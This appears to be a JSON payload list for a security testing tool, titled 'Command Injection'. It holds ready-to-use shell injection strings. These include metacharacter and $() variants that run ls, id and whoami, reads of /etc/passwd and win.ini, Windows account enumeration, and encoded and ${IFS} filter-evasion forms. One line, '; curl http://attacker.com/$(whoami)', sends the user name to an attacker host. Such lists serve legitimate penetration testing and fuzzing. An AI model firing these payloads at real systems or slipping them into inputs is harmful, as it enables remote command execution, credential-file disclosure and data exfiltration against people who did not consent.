{
  "id": "command-injection",
  "name": "Command Injection",
  "version": "1.0",
  "description": "Shell metacharacter, backtick, and encoded command injection payloads",
  "tags": ["injection", "rce", "command"],
  "payloads": [
    "; ls",
    "| ls",
    "& ls",
    "`ls`",
    "$(ls)",
    "; ls -la",
    "| ls -la /",
    "; cat /etc/passwd",
    "| cat /etc/passwd",
    "& cat /etc/passwd",
    "`cat /etc/passwd`",
    "$(cat /etc/passwd)",
    "; id",
    "| id",
    "& id",
    "`id`",
    "$(id)",
    "; whoami",
    "| whoami",
    "& whoami",
    "; uname -a",
    "| uname -a",
    "; sleep 5",
    "| sleep 5",
    "& sleep 5",
    "$(sleep 5)",
    "; ping -c 5 127.0.0.1",
    "& ping -c 5 127.0.0.1",
    "| ping -c 5 127.0.0.1",
    "; curl http://attacker.com/$(whoami)",
    "& dir",
    "| dir",
    "& type C:\\Windows\\win.ini",
    "| type C:\\Windows\\win.ini",
    "& net user",
    "& net localgroup administrators",
    "%3B%20ls",
    "%7C%20id",
    "%26%20whoami",
    "|| ls",
    "&& ls",
    "; echo vulnerable",
    "| rev /etc/passwd",
    "${IFS}cat${IFS}/etc/passwd",
    ";{ls,/}",
    "$(printf '\\x63\\x61\\x74\\x20\\x2f\\x65\\x74\\x63\\x2f\\x70\\x61\\x73\\x73\\x77\\x64')",
    "\nls\n",
    "\r\nls\r\n"
  ]
}
